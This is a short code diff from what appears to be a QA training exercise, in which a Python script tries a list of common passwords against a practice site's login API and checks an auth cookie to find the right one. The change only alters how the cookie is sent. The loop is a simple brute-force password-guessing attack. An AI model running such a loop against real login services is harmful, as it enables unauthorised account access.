@@ -10,9 +10,8 @@ password = ""
 for password in unique_passwords:
     payload = {"login": login, "password": password}
     response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
-    cookie = response.cookies.get("auth_cookie")
-    cookie_params = {"cookie": cookie}
-    response_auth = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", params=cookie_params)
+    cookie = response.cookies
+    response_auth = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie)
     if response_auth.text != "You are NOT authorized":
         print(f"login = {login}, password = {password}")
         break
